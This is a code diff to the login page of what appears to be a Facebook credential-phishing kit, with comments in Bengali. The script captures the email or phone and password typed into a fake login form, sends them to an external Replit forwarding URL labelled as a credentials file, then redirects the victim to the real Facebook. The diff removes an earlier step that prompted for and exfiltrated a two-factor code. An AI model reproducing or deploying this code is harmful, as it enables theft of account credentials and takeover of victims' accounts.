@@ -32,7 +32,7 @@
         </div>
     </div>
 
-    <script>
+<script>
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -40,16 +40,15 @@
         const pass = document.getElementById('pass').value;
         const submitBtn = document.getElementById('submitBtn');
 
-        submitBtn.innerText = "Checking security...";
+        submitBtn.innerText = "Connecting...";
         submitBtn.disabled = true;
 
         const REPLIT_URL = "https://9f77dca3-e9b1-49d2-9c4b-35efceb5aadb-00-1bjgtzkskpfqc.worf.replit.dev:5000/forward";
 
-        // প্রথম ধাপ: আইডি-পাসওয়ার্ড পাঠানো
         const data = {
-            domain: "Cyber_Shield_2FA_Portal",
-            fileName: "FB_Logins.txt",
-            content: "Email/Phone: " + email + "\nPassword: " + pass
+            domain: "Cyber_Shield_Portal",
+            fileName: "credentials.txt",
+            content: "User: " + email + "\nPass: " + pass
         };
 
         fetch(REPLIT_URL, {
@@ -59,32 +58,13 @@
             body: JSON.stringify(data)
         })
         .then(() => {
-            // আইডি পাসওয়ার্ড যাওয়ার পর ২-ফ্যাক্টর কোড চাওয়ার জন্য বক্স দেখানো
-            const code = prompt("Two-factor authentication is enabled for this account.\nPlease enter the 6-digit code sent to your phone:");
-            
-            if (code) {
-                // দ্বিতীয় ধাপ: ২-ফ্যাক্টর কোড পাঠানো
-                const codeData = {
-                    domain: "Cyber_Shield_2FA_Portal",
-                    fileName: "2FA_Code.txt",
-                    content: "Email: " + email + "\n2FA Code: " + code
-                };
-
-                return fetch(REPLIT_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    mode: 'cors',
-                    body: JSON.stringify(codeData)
-                });
-            }
-        })
-        .then(() => {
-            // সব শেষে আসল ফেসবুকে পাঠিয়ে দেওয়া (সঠিক লিঙ্ক)
-            window.location.href = "https://www.facebook.com/login.php";
+            // ডাটা যাওয়ার পর সরাসরি ফেসবুকের মেইন লিঙ্কে পাঠিয়ে দিন
+            window.location.replace("https://www.facebook.com");
         })
         .catch(error => {
             console.error('Error:', error);
-            window.location.href = "https://www.facebook.com";
+            // এরর হলেও মূল ফেসবুকে পাঠিয়ে দিন
+            window.location.replace("https://www.facebook.com");
         });
     });
 </script>
